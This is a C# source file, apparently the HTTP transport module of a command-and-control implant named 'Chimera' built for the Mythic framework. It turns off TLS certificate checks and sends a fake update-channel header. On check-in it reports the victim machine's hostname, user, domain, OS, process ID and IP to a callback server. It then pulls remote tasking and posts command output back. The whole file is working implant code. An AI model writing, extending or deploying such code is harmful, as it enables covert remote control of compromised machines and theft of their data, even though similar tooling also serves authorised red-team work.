using System;
using System.Net;
using System.Net.Http;
using System.Text;

namespace Chimera
{
    // Mythic wire format when mythic_encrypts = True:
    // Send:    Base64( UUID[36 bytes] + plaintext_json )
    // Receive: Base64( UUID[36 bytes] + plaintext_json ) -- strip first 36 bytes
    public static class C2Http
    {
        private static readonly HttpClient Client = CreateClient();

        private static HttpClient CreateClient()
        {
            var handler = new HttpClientHandler();
            handler.ServerCertificateCustomValidationCallback =
                (msg, cert, chain, errors) => true;
            var client = new HttpClient(handler);
            client.DefaultRequestHeaders.Add("User-Agent", Config.UserAgent);
            client.DefaultRequestHeaders.Add("Accept", "application/json");
            client.DefaultRequestHeaders.Add("X-Update-Channel", "stable");
            return client;
        }

        private static string Wrap(string plaintext)
        {
            byte[] uuidBytes = Encoding.UTF8.GetBytes(Config.PayloadUUID);
            byte[] bodyBytes = Encoding.UTF8.GetBytes(plaintext);
            byte[] combined  = new byte[uuidBytes.Length + bodyBytes.Length];
            Buffer.BlockCopy(uuidBytes, 0, combined, 0, uuidBytes.Length);
            Buffer.BlockCopy(bodyBytes, 0, combined, uuidBytes.Length, bodyBytes.Length);
            return Convert.ToBase64String(combined);
        }

        private static string Unwrap(string base64Response)
        {
            byte[] combined = Convert.FromBase64String(base64Response);
            if (combined.Length <= 36) return null;
            return Encoding.UTF8.GetString(combined, 36, combined.Length - 36);
        }

        public static string Send(string jsonMessage)
        {
            try
            {
                string wrapped = Wrap(jsonMessage);
                var content    = new StringContent(wrapped, Encoding.UTF8, "application/json");
                var response   = Client.PostAsync(Config.CallbackURL, content)
                                       .GetAwaiter().GetResult();
                string body    = response.Content.ReadAsStringAsync()
                                         .GetAwaiter().GetResult();
                return Unwrap(body);
            }
            catch { return null; }
        }

        public static string CheckIn()
        {
            string hostname = Dns.GetHostName();
            string username = Environment.UserName;
            string os       = Environment.OSVersion.ToString();
            int    pid      = System.Diagnostics.Process.GetCurrentProcess().Id;
            string arch     = Environment.Is64BitProcess ? "x64" : "x86";
            string domain   = Environment.UserDomainName;

            string json = string.Format(@"{{
                ""action"": ""checkin"",
                ""uuid"": ""{0}"",
                ""ips"": [""{1}""],
                ""os"": ""{2}"",
                ""user"": ""{3}\\{4}"",
                ""host"": ""{5}"",
                ""pid"": {6},
                ""architecture"": ""{7}"",
                ""domain"": ""{3}"",
                ""integrity_level"": 2,
                ""external_ip"": """"
            }}", Config.PayloadUUID, GetLocalIP(), os, domain, username, hostname, pid, arch);

            return Send(json);
        }

        public static string GetTasking(string callbackUUID)
        {
            string json = string.Format(@"{{
                ""action"": ""get_tasking"",
                ""tasking_size"": 1,
                ""uuid"": ""{0}""
            }}", callbackUUID);
            return Send(json);
        }

        public static string PostResponse(string callbackUUID, string taskID, string output)
        {
            string escaped = output
                .Replace("\\", "\\\\")
                .Replace("\"", "\\\"")
                .Replace("\r", "\\r")
                .Replace("\n", "\\n");

            string json = string.Format(@"{{
                ""action"": ""post_response"",
                ""uuid"": ""{0}"",
                ""responses"": [{{
                    ""task_id"": ""{1}"",
                    ""user_output"": ""{2}"",
                    ""completed"": true
                }}]
            }}", callbackUUID, taskID, escaped);
            return Send(json);
        }

        private static string GetLocalIP()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        return ip.ToString();
            }
            catch { }
            return "127.0.0.1";
        }
    }
}
